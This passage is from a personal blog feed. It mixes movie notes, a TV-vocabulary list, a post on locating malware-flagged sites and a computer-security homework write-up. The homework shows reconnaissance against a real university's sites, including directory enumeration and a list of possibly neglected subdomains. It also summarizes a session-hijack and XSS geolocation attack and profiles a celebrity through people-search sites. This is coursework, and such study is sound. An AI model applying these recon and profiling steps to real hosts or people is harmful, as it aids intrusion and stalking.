&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt0086190/"&gt;Star Wars: Episode VI - Return of the Jedi (1983)&lt;/a&gt; (2017/12/16)  &lt;ul&gt;
&lt;li&gt;終於看了大受好評的星際大戰經典三部曲，學到了不少英文啊。  &lt;/li&gt;
&lt;li&gt;rendezvous, pulverize, disintegration  &lt;/li&gt;
&lt;li&gt;特效個人覺得比同期的 Alien 遜色不少  &lt;/li&gt;
&lt;li&gt;剪接技巧也有些粗糙  &lt;/li&gt;
&lt;li&gt;會紅的原因我想是因為題材跳脫了當時電影的框架及加入鮮明易懂的元素吧  &lt;/li&gt;
&lt;li&gt;就算沒看過電影也聽聞過光劍、原力和配樂  &lt;/li&gt;
&lt;li&gt;劇情上則是黑武士的轉折  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt0120915/"&gt;Star Wars: Episode I - The Phantom Menace (1999) - IMDb&lt;/a&gt; (2017/12/17)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt0121765/"&gt;Star Wars: Episode II - Attack of the Clones (2002) - IMDb&lt;/a&gt; (2017/12/17)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt0121766/"&gt;Star Wars: Episode III - Revenge of the Sith (2005) - IMDb&lt;/a&gt; (2017/12/18)  &lt;ul&gt;
&lt;li&gt;先看完經典三部曲真的會讓人比較有興趣看前傳三部曲，還記得大概 5 年前某天晚上想一次把前六部曲看完，結果看到第二部就覺得太無聊而睡著了。  &lt;/li&gt;
&lt;li&gt;前傳三部曲的評價普遍不高，主要應該是因為劇情沒有什麼太大的起伏轉折吧，我覺得一方面也是因為大多數人都看過經典三部曲了，所以知道未來的走向會怎麼發展，誰最後有活下來之類的，所以即便看到再驚險的打鬥場面都會覺得「啊，這個角色在經典三部曲有出現過，所以他在這裡不會死。」  &lt;/li&gt;
&lt;li&gt;我想導演應該也有想到這樣的事，所以前傳三部曲就加強了其他的部份，像我自己就覺得特效、剪接與光劍打鬥場面在前傳三部曲都有極大水準的提升。當然也有人會說畢竟一部曲和六部曲中間隔了 16 年，這樣的提升應該是基本。但我還是覺得前傳三部曲算是 George Lucas 站在經典三部曲的穩固基礎上，再把星際大戰系列推向更完整的商業化電影的一個手段，更浩大的場景、更磅礡的畫面、更順暢的武打、更像樣的光劍（？）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt3748528/"&gt;Rogue One (2016) - IMDb&lt;/a&gt; (2017/12/18)  &lt;ul&gt;
&lt;li&gt;真的好看，讓人感動到哭的點有好多個，劇情方面也不拖泥帶水，而且也有穿插一些幽默的笑點。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt4972582/"&gt;Split (2016)&lt;/a&gt; (2017/12/20)  &lt;ul&gt;
&lt;li&gt;James McAvoy 一人分飾好幾角，真的厲害，不知道演這種劇本會不會也演到人格分裂？  &lt;/li&gt;
&lt;li&gt;Anya Taylor-Joy 好...好可愛。  &lt;/li&gt;
&lt;li&gt;片尾的部份看不太懂，去搜尋了一下才發現是導演 Night Shyamalan 的用心良苦啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt0217869/"&gt;Unbreakable (2000)&lt;/a&gt; (2017/12/21)  &lt;ul&gt;
&lt;li&gt;因為 Split 才去看這部電影，因為 Split 跟這部電影是處於同個世界，看完大概可以理解為什麼這部不紅的原因。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt0088763/"&gt;Back to the Future (1985) - IMDb&lt;/a&gt; (2017/12/24)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt0096874/"&gt;Back to the Future Part II (1989) - IMDb&lt;/a&gt; (2017/12/24)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt0099088/"&gt;Back to the Future Part III (1990) - IMDb&lt;/a&gt; (2017/12/24)  &lt;ul&gt;
&lt;li&gt;一次就把這個在我出生前就拍完的系列看完了，原來是 Steven Spielberg 的作品。挺厲害的，透過時空穿越的題材造就了一部老少咸宜的電影。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt2911666/"&gt;John Wick (2014) - IMDb&lt;/a&gt; (2017/12/25)  &lt;ul&gt;
&lt;li&gt;竟然有點久沒看到的 Keanu Reeves，不知道為啥看這部的時候一直想到 Tom Cruise 演的落日殺神。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt4540710/"&gt;Miss Sloane (2016) - IMDb&lt;/a&gt; (2017/12/26)  &lt;ul&gt;
&lt;li&gt;挺不錯的劇情片，有點像在看 House of Cards 的感覺。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt0765429/"&gt;American Gangster (2007) - IMDb&lt;/a&gt;  (2017/12/27)  &lt;ul&gt;
&lt;li&gt;看丹佐華盛頓跟羅素克洛飆戲，看這部多少就會想到《教父》裡頭的情節。  &lt;/li&gt;
&lt;li&gt;看英文有些地方有點吃力，主要是因為不熟紐約的地理位置，出現了很多行政區的名字。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt0167404/"&gt;The Sixth Sense (1999) - IMDb&lt;/a&gt; (2017/12/28)  &lt;ul&gt;
&lt;li&gt;最後的伏筆真的完全騙到我了，要恐怖有恐怖，要溫馨有溫馨，要劇情有劇情，Night Shyamalan 真的很強。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt0139654/"&gt;Training Day (2001) - IMDb&lt;/a&gt; (2017/12/28)  &lt;ul&gt;
&lt;li&gt;又是丹佐華盛頓，我覺得他在這部裡的演技超好，這部完全就是在看他秀獨角戲，劇情方面沒什麼精彩的，主要就 Denzel Washington 把角色的草根性展現的很自然。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2016  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="/posts/2016/01/10/winter-on-fire/"&gt;Winter on Fire: Ukraine's Fight for Freedom&lt;/a&gt; (2016/01/10)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2016/01/23/fight-club/"&gt;Fight Club (1999)&lt;/a&gt; (2016/01/23)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt1386697/"&gt;Suicide Squad (2016) - IMDb&lt;/a&gt; (2016/08/18)  &lt;ul&gt;
&lt;li&gt;真的是去看小丑女的，小丑女太棒。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://zh.wikipedia.org/zh-hant/%E6%A8%93%E4%B8%8B%E7%9A%84%E6%88%BF%E5%AE%A2"&gt;樓下的房客 - 維基百科，自由的百科全書&lt;/a&gt; (2016/08/23)  &lt;ul&gt;
&lt;li&gt;怎麼說呢？電影礙於尺度問題我覺得還是沒辦法完全詮釋小說就是，第一次看原著小說的時候我是真的看到想吐。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt4196776/"&gt;Jason Bourne (2016) - IMDb&lt;/a&gt; (2016/08/28)  &lt;ul&gt;
&lt;li&gt;覺得劇情還好，就是爽片一部，特殊的點就是會加入一些時事吧？希臘抗議遊行跟史諾登等等。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt3385516/"&gt;X-Men: Apocalypse (2016) - IMDb&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;覺得還滿好看的，有許多不同的元素，然後濃濃的復古風，也交待了很多事，例如：X 授怎麼變光頭的、萬磁王的悲慘過去、第一次與金鋼狼的相遇、風暴女如何出現的。但不知道這次才出現的音速小子是誰，之前好像都沒看過？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt0803096/"&gt;Warcraft: The Beginning (2016) - IMDb&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;覺得拍的還不錯耶，雖然只玩過一點點魔獸世界，也沒有很瞭解劇情，查了一下，電影好像有改編過，但劇情的複雜度看起來是夠的，Frostwolf 的首領實在太賺人眼淚了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt3859304/"&gt;The Bronze (2015) - IMDb&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;講的是個體操奧運選手得了銅牌後因傷退休後成了整天無所事事的米蟲，之後因為當初訓練她的教練自殺身亡，而代替了該教練的職務訓練一位體操新秀的故事，看完後覺得沒什麼值得看的。裏面大量的髒話，非常的美式。當初會知道這部也只是因為女主角是飾演 The Big Bang Theory 中 Bernadette 的 &lt;a href="https://en.wikipedia.org/wiki/Melissa_Rauch"&gt;Melissa Rauch&lt;/a&gt;，然後&lt;a href="https://www.youtube.com/watch?v=N4mQzJ40pWA"&gt;裡面的性愛場景非常之猛&lt;/a&gt;。（雖然後來查了一下似乎是替身）然後看完這部只覺得 Melissa Rauch 身上的雀斑真的好多啊（誒  &lt;/li&gt;
&lt;li&gt;發現美國近年來好像都有電影拿奧運當題材，像之前的 Foxcatcher 也是講一些奧運摔角的黑暗面。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt4851640/"&gt;《師父》&lt;/a&gt; (2016/10/15)  &lt;ul&gt;
&lt;li&gt;很棒的武打戲，埋了很多哏，節奏非常快，需要注意一些細節。  &lt;/li&gt;
&lt;li&gt;需要注意一些細節，不是按照事件發生的時間順序播放。  &lt;/li&gt;
&lt;li&gt;出現很多種刀類的兵器，尤其是最後的巷戰非常過癮。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://movie.douban.com/subject/7564989/"&gt;《箭士柳白猿》&lt;/a&gt; (2016/11/12)&lt;br /&gt;
    — 和《師父》一樣是徐皓峰的作品，不過這部前面有點跳，中間有點拖，然後有些導演慣用的幽默手法和個人覺得有一點點蒙太奇的感覺。  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt1211837/"&gt;《奇異博士》&lt;/a&gt; (2016/11/13)  &lt;ul&gt;
&lt;li&gt;看了之後才知道 Doctor Strange 的 Doctor 是醫生不是博士，雖然翻成《奇異醫生》也滿怪的就是。  &lt;/li&gt;
&lt;li&gt;開車千萬他媽的不要用手機  &lt;/li&gt;
&lt;li&gt;滿多笑點的，算是 Marvel 一貫的笑點。  &lt;/li&gt;
&lt;li&gt;時光倒流打架那段很酷  &lt;/li&gt;
&lt;li&gt;「多瑪暮，我是來找你談判的。」無窮迴圈很白目  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt1211837/"&gt;《奇異博士》&lt;/a&gt; (2016/11/13)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.imdb.com/title/tt3183660/"&gt;《怪獸與牠們的產地》&lt;/a&gt; (2016/11/17, 2016/11/27)  &lt;ul&gt;
&lt;li&gt;看了兩次，第一次是和同事們看 2D 的，第二次是跟 Apua 看 3D 的。  &lt;/li&gt;
&lt;li&gt;有看過哈利波特系列作品的人應該會比較瞭解劇情走向，但沒有看過的人還是可以看看可愛的怪獸（？  &lt;/li&gt;
&lt;li&gt;即便是有看過哈利波特系列的人可能也會忽略掉一些細節  &lt;/li&gt;
&lt;li&gt;我還滿喜歡&lt;a href="https://www.youtube.com/watch?v=WBOMpfxsUpk&amp;amp;index=1&amp;amp;list=PLt2IXJmkinUXaipWpm4teTmVPSXq8hLKw"&gt;這部電影的配樂&lt;/a&gt;的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Life"></category></entry><entry><title>Vocabulary of The Big Bang Theory S08E12 - The Space Probe Disintegration</title><link href="https://blog.m157q.tw/posts/2015/01/14/vocabulary-of-the-big-bang-theory-s08e12-the-space-probe-disintegration/" rel="alternate"></link><published>2015-10-27T12:51:00+08:00</published><updated>2015-10-27T12:51:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-01-14:posts/2015/01/14/vocabulary-of-the-big-bang-theory-s08e12-the-space-probe-disintegration/</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;space probe  
太空探測船  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;disintegration  
KK[dɪs͵ɪntəˋgreʃən] DJ[dis͵intiˋgreiʃən]  
n.[U]不可數名詞  
  1. 碎裂；瓦解，崩潰  
    the disintegration of a nuclear-powered satellite  
    一顆核動力衛星的破碎解體  
  2. 【核】銳變；衰變  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;hypocrisy  
KK[hɪˋpɑkrəsɪ] DJ[hiˋpɔkrəsi]  
n.名詞  
  1. 偽善；虛偽[U]  
    social injustice and official hypocrisy  
    社會的不公以及政府的虛偽  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;plummet  
KK[ˋplʌmɪt] DJ[ˋplʌmit]  
n.名詞  
  1. 墜子；測鉛  
  2. 重壓  
vi.不及物動詞  
  1. 筆直落下  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pharmaceutical  
KK[͵fɑrməˋsjutɪk!] DJ[͵fɑ:məˋsju:tikl]  
a.形容詞  
  1. 藥的  
  2. 配藥的；配藥學的  
  3. 製藥的  
  4. 藥劑師的  
n.名詞  
  1. 藥品，藥劑  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;prowess  
KK[ˋpraʊɪs] DJ[ˋprauis]  
n.[U]不可數名詞  
  1. 英勇；無畏  
  2. 非凡的能力；高超的本領  
    a display of military prowess  
    傑出的軍事才能的顯示  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;stationary bike  
ph.片語  
  1. 健身車；室內腳踏車；腳踏車機  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;lingerie  
KK[ˋlænʒə͵ri] DJ[ˋlænʒəri:]  
n.名詞  
  1. 女用貼身內衣褲；女睡衣[U]  
    She wanted to buy some lingerie on her way home.  
    她想在回家的路上買些女用貼身內衣褲。  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;comfy  
KK[ˋkʌmfɪ] DJ[ˋkʌmfi]  
a.【口】  
  1. 舒服的  
  2. 令人欣慰的  
  3. 寬裕的；充裕的  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;compromise  
KK[ˋkɑmprə͵maɪz] DJ[ˋkɔmprəmaiz]  
n.名詞  
  1. 妥協，和解[C][U][（+between）]  
    I hope we shall come to a compromise.  
    我希望我們能達成妥協。  
  2. 妥協方案，折衷辦法；折衷物[C]  
    The interior decoration of the house is a compromise between Chinese and foreign styles.  
    這所房子的內部裝飾是中西兩式的折衷物。  
  3. 連累，危及[S][（+of）]  
    She did it without compromise of her reputation.  
    她做這事而無損她的名譽。  
  4. （原則等的）放棄[S][（+of）]  
vt.及物動詞  
  1. 互讓解決（分歧等）  
  2. 連累，危及  
    You will compromise your good name if you associate with these people.  
    你如果與這些人交往就會損害你的好名聲。  
  3. 放棄（原則等）；洩露（祕密等）  
    He refused to compromise his principles.  
    他拒絕放棄原則。  
vi.不及物動詞  
  1. 妥協，讓步[（+on）]  
    They found it wiser to compromise with her.  
    他們覺得與她妥協更明智。  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;lettuce  
KK[ˋlɛtɪs] DJ[ˋletis]  
n.名詞  
  1. 萵苣[C][U]  
    Go and buy a couple of lettuces.  
    去買兩棵萵苣吧。  
  2. 【美】【俚】紙幣[U]  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Judaism  
KK[ˋdʒudɪ͵ɪzəm] DJ[ˋdʒu:di͵izəm]  
n.名詞  
  1. 猶太教  
  2. 猶太文明  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;brisket  
KK[ˋbrɪskɪt] DJ[ˋbriskit]  
n.名詞  
  1. 胸部；胸肉  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;dreidel  
n.名詞  
  1. A toy similar to a spinning top used in games of chance played by children and adults at Hanukkah.  

[光明節陀螺 - 維基百科，自由的百科全書](http://zh.wikipedia.org/zh-tw/%E5%85%89%E6%98%8E%E8%8A%82%E9%99%80%E8%9E%BA)  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;imperialist  
KK[ɪmˋpɪrɪəlɪst] DJ[imˋpiəriəlist]  
n.名詞  
  1. 帝國主義者  
a.形容詞  
  1. 帝國主義的  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;faraday  
KK[ˋfærədɪ] DJ[ˋfærədi]  
n.名詞  
  1. 【物】法拉第（電容單位）  

Faraday [ˋfɑrədæɪ] 法拉第 （人名）  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cult  
KK[kʌlt] DJ[kʌlt]  
n.[C]可數名詞  
  1. 膜拜，膜拜儀式  
  2. 異教；教派  
    When did he join the cult?  
    他是什麼時候加入這個教派的？  
  3. （對人、思想、事物等的）狂熱崇拜，迷信；狂熱  
    the cult of Whitman  
    對惠特曼的崇拜  
  4. （總稱）崇拜者，迷信者  
  5. 崇拜的對象；狂熱喜愛的對象  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;p&gt;&lt;a href="http://en.wikipedia.org/wiki/Peripheral_vision"&gt;Peripheral vision - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;immense  
KK[ɪˋmɛns] DJ[iˋmens]  
a.形容詞  
  1. 巨大的；廣大的；無邊無際的；無限的  
    John felt an immense gratitude to Wilson.  
    約翰極為感激威爾遜。  
  2. 【口】非常好的，極妙的  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;roomie  

  1. 室友  
&lt;/pre&gt;&lt;/div&gt;</summary><category term="Vocabulary"></category><category term="The Big Bang Theory"></category><category term="English"></category><category term="TV Series"></category><category term="Geek"></category></entry><entry><title>Find Malicious Website via Google Safe Browsing Diagnostic API</title><link href="https://blog.m157q.tw/posts/2015/01/14/find-malicious-website-via-google-safe-browsing-diagnostic-api/" rel="alternate"></link><published>2015-10-27T12:00:00+08:00</published><updated>2015-10-27T12:00:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-01-14:posts/2015/01/14/find-malicious-website-via-google-safe-browsing-diagnostic-api/</id><summary type="html">&lt;p&gt;One of my friends need to analyze the websites which are sentenced to be malicious website by the Google (Chrome safe browsing) for one of his security related course homeworks.&lt;br /&gt;
He told me that it's very hard to find such links, so I found this kind of solution for him.  &lt;/p&gt;
&lt;p&gt;&lt;img alt="The site ahead contains malware" src="/files/find-malicious-website-via-google-safe-browsing-diagnostic-api/the_site_ahead_contains_malware.png" /&gt;  &lt;/p&gt;
&lt;h3&gt;Use the Google Safe Browsing Diagnostic API&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://www.google.com/safebrowsing/diagnostic?site=Google.com"&gt;https://www.google.com/safebrowsing/diagnostic?site=Google.com&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Change the value of the &lt;code&gt;site&lt;/code&gt; to some portal site such as Google, Yahoo, ...  &lt;/li&gt;
&lt;li&gt;Check the result if it has &lt;code&gt;Malicious software is hosted on 276 domain(s), including ...&lt;/code&gt; like the following pic  &lt;/li&gt;
&lt;li&gt;Try those urls to see if Google Safe Browsing diagnose it as malicious urls  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="Safe Browsing" src="/files/find-malicious-website-via-google-safe-browsing-diagnostic-api/safe_browsing.png" /&gt;  &lt;/p&gt;
&lt;h3&gt;The result of &lt;a href="http://24corp-shop.com/"&gt;http://24corp-shop.com/&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;&lt;img alt="24corp shop" src="/files/find-malicious-website-via-google-safe-browsing-diagnostic-api/24corp_shop.png" /&gt;  &lt;/p&gt;
&lt;h3&gt;NOTICE&lt;/h3&gt;
&lt;p&gt;Sometimes you won't see the "Security Error" message because the result shows the record in last 90 days.&lt;br /&gt;
When you access the website, the malicious software maybe already be removed from that site.  &lt;/p&gt;</summary><category term="Malicious Website"></category><category term="Safe Browsing"></category><category term="Security"></category></entry><entry><title>Intro CompSec Hw1</title><link href="https://blog.m157q.tw/posts/2014/12/18/intro-compsec-hw1/" rel="alternate"></link><published>2014-12-18T16:51:00+08:00</published><updated>2014-12-18T16:51:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-12-18:posts/2014/12/18/intro-compsec-hw1/</id><summary type="html">&lt;h3&gt;Introduction to Computer Security HW1&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Select a web site.  &lt;ul&gt;
&lt;li&gt;Use “Wget” or “Teleport Pro” to mirror the site. Look for comments within comment tags. Give screen dumps and explain what you found.  &lt;ul&gt;
&lt;li&gt;Screen Dumps &amp;amp; Explanations  &lt;ul&gt;
&lt;li&gt;I've found some hidden targets that not be shown on the home page of &lt;a href="http://www.nctu.edu.tw"&gt;http://www.nctu.edu.tw&lt;/a&gt;. These website probably still working but out of date or have already be deprecated that nobody maintain the website and may have some flaws. Below is the lists.  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://140.113.71.51"&gt;http://140.113.71.51&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 1" src="/files/intro-compsec-hw1/screenshot1.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://president.nctu.edu.tw"&gt;http://president.nctu.edu.tw&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 2" src="/files/intro-compsec-hw1/screenshot2.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.pac.nctu.edu.tw"&gt;http://www.pac.nctu.edu.tw&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 3" src="/files/intro-compsec-hw1/screenshot3.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.pac.nctu.edu.tw"&gt;http://www.pac.nctu.edu.tw&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 4" src="/files/intro-compsec-hw1/screenshot4.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ccs.nctu.edu.tw"&gt;http://www.ccs.nctu.edu.tw&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 5" src="/files/intro-compsec-hw1/screenshot5.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.itt.nctu.edu.tw"&gt;http://www.itt.nctu.edu.tw&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 6" src="/files/intro-compsec-hw1/screenshot6.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ga.nctu.edu.tw"&gt;http://www.ga.nctu.edu.tw&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 7" src="/files/intro-compsec-hw1/screenshot7.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://campus.creativity.edu.tw"&gt;http://campus.creativity.edu.tw&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 8" src="/files/intro-compsec-hw1/screenshot8.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://apc.iim.nctu.edu.tw"&gt;http://apc.iim.nctu.edu.tw&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 9" src="/files/intro-compsec-hw1/screenshot9.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://saofficion.adm.nctu.edu.tw"&gt;http://saofficion.adm.nctu.edu.tw&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 10" src="/files/intro-compsec-hw1/screenshot10.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use “DirBuster” with a proxy feature through “privoxy” to enumerate hidden files and directories. Screen dump and explain the hidden files and directories you found.  &lt;ul&gt;
&lt;li&gt;Screen Dumps &amp;amp; Explanations  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 11" src="/files/intro-compsec-hw1/screenshot11.png" /&gt;  &lt;/li&gt;
&lt;li&gt;&lt;img alt="Screenshot 12" src="/files/intro-compsec-hw1/screenshot12.png" /&gt;  &lt;ul&gt;
&lt;li&gt;Maybe there some something useful in these index.php files.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Lookup “How I met your girlfriend” in the BlackHat 2010 demo to explain, in 0.5 page, how this was done.  &lt;ul&gt;
&lt;li&gt;Explanations  &lt;blockquote&gt;
&lt;p&gt;The speaker first study on the session mechanism of the Facebook.&lt;br /&gt;
He reduced the complexity of breaking session steps by steps.&lt;br /&gt;
The Entropy had be redurced from the initial 160 bits to only 20 bits!! He kept tracing the source code and hacking it.&lt;br /&gt;
Then, he used a techical skill called "NAT pinning" to confuse the router at protocol level.&lt;br /&gt;
After that, he also used the IRC bot, Geoloction via XSS and HTML5 anti-WAF XSS.&lt;br /&gt;
Combined all these skills and analysized based on those results.&lt;br /&gt;
Finally, he used the triangle localization to find someone's girlfriend in reality.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Select a person. Use on-line sites for phone book, social network, information, job, photo management, business directory, jigsaw.com, etc. to summarize, with screen dumps and explanations, what information you can get. If your target is not in US nor native English speaker, you might need to use on-line sites different from the textbook.  &lt;ul&gt;
&lt;li&gt;Screen Dumps &amp;amp; Explanations  &lt;ul&gt;
&lt;li&gt;Name: Johnny Depp (John Christopher Depp II)  &lt;/li&gt;
&lt;li&gt;wikipedia: &lt;a href="http://en.wikipedia.org/wiki/Johnny_Depp"&gt;http://en.wikipedia.org/wiki/Johnny_Depp&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.peoplesearch.com"&gt;http://www.peoplesearch.com&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;img alt="Screenshot 13" src="/files/intro-compsec-hw1/screenshot13.png" /&gt;  &lt;/li&gt;
&lt;li&gt;view more need to pay some money  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
